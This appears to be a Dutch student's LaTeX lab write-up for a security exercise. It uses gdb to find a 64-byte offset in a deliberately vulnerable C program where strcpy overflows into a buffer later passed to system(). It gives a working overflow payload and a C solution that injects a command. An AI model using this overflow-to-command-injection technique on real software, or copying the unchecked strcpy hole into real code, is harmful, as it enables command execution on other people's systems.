\begin{enumerate}
  \item gcc-3.3 -g -o log-analyzer log-analyzer.c
  \item gdb -q log-analyzer
  \item (gdb) list
  	\begin{enumerate}
  	\item Door dit commando uit te voeren krijgen we een overzicht van de programma code
  	\item We zoeken de scharnierpunten in dit programma:
  		\begin{enumerate}
  		\item 1 argument: \textless servernaam\textgreater
  		\item command
  		\item name
  		\item strcpy(command ... ) op lijn 20
  			\begin{enumerate}
  			\item command wordt uitgevoerd door system(command) (lijn 27)
  			\item command overschrijven door strcpy(name, servernaam); op lijn 25
  			\end{enumerate}
  		\end{enumerate}
  	\end{enumerate}
  \item (gdb) break 26 
  	\begin{enumerate}
  	\item Adres van command bekijken
  	\item Adres van name bekijken
  	\end{enumerate}
  \item (gdb) run ``blah''
  \item (gdb) x/x command
  	\begin{enumerate}
  	\item 0xbffff6c0
  	\end{enumerate}
  \item (gdb) x/x name
  	\begin{enumerate}
  	\item 0xbffff680
  	\end{enumerate}
  \item (gdb) print 0xbffff6c0 - 0xbffff680
  	\begin{enumerate}
  	\item \$1 = 64
  	\end{enumerate}
  \item (gdb) run ``\$(perl -e `print ``A''x64 . ``echo \textbackslash{}``\textbackslash{}nEPIC TEST\textbackslash{}n\textbackslash{}''\textbackslash{}n'' ')''
  \item x/s command
  	\begin{enumerate}
  	\item 0xbffff670: ``echo \textbackslash{}``\textbackslash{}nEPIC TEST\textbackslash{}n\textbackslash{}'' ''
  	\end{enumerate}
  \item Succes. EPIC TEST verschijnt op het scherm.
  \item De opgave zegt dat we nu zelf een programma moeten schrijven die de juiste output genereert.
  \item Een voorbeeldscript:
\end{enumerate}

\begin{lstlisting}
oplossing.c
-----------

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* 

Resultaat:
-=-=-=-=-=-
echo "Mail-server: no errors found"
*/

// ./a.out "$(perl -e 'print "A"x64 . "echo \"\nEPIC TEST\n\"\"')"    

int main(int argc, char *argv[]){
	char command[] = "./oef4 \"$(perl -e 'print \"A\"x64 . \"echo \\\"\\n";
	strcat(command, "Mail-server: no errors found");
	strcat(command, "\\n\\\"\"')\"");

	system(command);
}

OUTPUT:
	Mail-server: no errors found
\end{lstlisting}

\begin{lstlisting}
log-analyzer.c
--------------

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char*argv[]){
	if(argc != 2){
		printf("Gebruik: %s <Server-naam>\n",argv[0]);
		exit(0);
	}

	/* Controleren of server wel bestaat */
	checkServerStatus(argv[1]);
}

int checkServerStatus(char *servernaam){
	char command[75];
	char name[50];

	if(strcmp(servernaam, "Mail-server") == 0){
		strcpy(command, "echo \"\n[ERROR]: Mail-server - r0123456 exploited your mail-server\n\"");
	}else{
		strcpy(command, "echo \"\n[ERROR]: Mail-server is the only registered server\n\"");
	}

	strcpy(name, servernaam);

	system(command);

	return (0);
}
\end{lstlisting}
